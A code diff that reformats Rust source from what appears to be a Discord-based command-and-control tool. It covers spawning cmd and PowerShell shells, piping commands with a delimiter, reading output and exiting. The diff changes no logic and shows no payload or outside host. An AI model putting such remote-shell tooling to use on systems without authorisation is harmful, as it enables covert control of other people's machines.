@@ -56,44 +56,20 @@ impl ShellType {
 	/// ### Returns
 	///
 	/// `Ok(())` if the write operation is successful, or an error of type `DiscordC2Error` if there was a problem.
-	async fn handle_stdin(
-		&self,
-		handler: &ProcessHandler,
-		command: &str,
-	) -> Result<(), DiscordC2Error> {
+	async fn handle_stdin(&self, handler: &ProcessHandler, command: &str) -> Result<(), DiscordC2Error> {
 		let mut process = handler.process.lock().await;
 
 		match self {
 			ShellType::Cmd => {
-				process
-					.stdin
-					.as_mut()
-					.unwrap()
-					.write_all(command.as_bytes())
-					.await?;
-				process
-					.stdin
-					.as_mut()
-					.unwrap()
-					.write_all(b" & echo ___CMDDELIM___")
-					.await?;
+				process.stdin.as_mut().unwrap().write_all(command.as_bytes()).await?;
+				process.stdin.as_mut().unwrap().write_all(b" & echo ___CMDDELIM___").await?;
 				process.stdin.as_mut().unwrap().write_all(b"\n").await?;
 				process.stdin.as_mut().unwrap().flush().await?;
 				Ok(())
 			},
 			_ => {
-				process
-					.stdin
-					.as_mut()
-					.unwrap()
-					.write_all(command.as_bytes())
-					.await?;
-				process
-					.stdin
-					.as_mut()
-					.unwrap()
-					.write_all(b"; echo ___CMDDELIM___")
-					.await?;
+				process.stdin.as_mut().unwrap().write_all(command.as_bytes()).await?;
+				process.stdin.as_mut().unwrap().write_all(b"; echo ___CMDDELIM___").await?;
 				process.stdin.as_mut().unwrap().write_all(b"\n").await?;
 				process.stdin.as_mut().unwrap().flush().await?;
 				Ok(())
@@ -134,8 +110,7 @@ impl ShellType {
 		let mut output = String::new();
 
 		let mut buf = [0; 4096];
-		while let Ok(read_result) = timeout(Duration::from_millis(10), stderr.read(&mut buf)).await
-		{
+		while let Ok(read_result) = timeout(Duration::from_millis(10), stderr.read(&mut buf)).await {
 			match read_result {
 				Ok(read_result) => {
 					if read_result > 0 {
@@ -171,35 +146,15 @@ impl ShellType {
 
 		let stdin_success: Result<ShellType, DiscordC2Error> = match self {
 			ShellType::Powershell => {
-				process
-					.stdin
-					.as_mut()
-					.unwrap()
-					.write_all("(Get-Location).Path".as_bytes())
-					.await?;
-				process
-					.stdin
-					.as_mut()
-					.unwrap()
-					.write_all(b"; echo ___CMDDELIM___")
-					.await?;
+				process.stdin.as_mut().unwrap().write_all("(Get-Location).Path".as_bytes()).await?;
+				process.stdin.as_mut().unwrap().write_all(b"; echo ___CMDDELIM___").await?;
 				process.stdin.as_mut().unwrap().write_all(b"\n").await?;
 				process.stdin.as_mut().unwrap().flush().await?;
 				Ok(ShellType::Powershell)
 			},
 			ShellType::Cmd => {
-				process
-					.stdin
-					.as_mut()
-					.unwrap()
-					.write_all("cd".as_bytes())
-					.await?;
-				process
-					.stdin
-					.as_mut()
-					.unwrap()
-					.write_all(b" & echo ___CMDDELIM___")
-					.await?;
+				process.stdin.as_mut().unwrap().write_all("cd".as_bytes()).await?;
+				process.stdin.as_mut().unwrap().write_all(b" & echo ___CMDDELIM___").await?;
 				process.stdin.as_mut().unwrap().write_all(b"\n").await?;
 				process.stdin.as_mut().unwrap().flush().await?;
 				Ok(ShellType::Cmd)
@@ -249,10 +204,7 @@ impl ProcessHandler {
 	async fn new(shell_type: ShellType) -> Result<Self, DiscordC2Error> {
 		// Open a new shell process based on the provided `shell_type`
 		let process = open_shell(shell_type).await?;
-		informational!(
-			"Successfully instantiated a new shell of type: {}",
-			shell_type.as_str()
-		);
+		informational!("Successfully instantiated a new shell of type: {}", shell_type.as_str());
 
 		// Create a new `ProcessHandler` instance with the shell type and the process wrapped in an `Arc<Mutex>`
 		Ok(ProcessHandler {
@@ -316,12 +268,7 @@ impl ProcessHandler {
 	pub async fn exit(&self) -> Result<(), DiscordC2Error> {
 		let mut process = self.process.lock().await;
 
-		process
-			.stdin
-			.as_mut()
-			.unwrap()
-			.write_all("exit".as_bytes())
-			.await?;
+		process.stdin.as_mut().unwrap().write_all("exit".as_bytes()).await?;
 		process.stdin.as_mut().unwrap().write_all(b"\n").await?;
 		process.kill().await?;
 
@@ -362,10 +309,7 @@ impl ProcessHandler {
 		if Path::new(&rexed).exists() {
 			Ok(String::from(rexed))
 		} else {
-			Err(DiscordC2Error::RegexError(format!(
-				"The rexed path doesn't exist (Path: {})",
-				rexed
-			)))
+			Err(DiscordC2Error::RegexError(format!("The rexed path doesn't exist (Path: {})", rexed)))
 		}
 	}
 
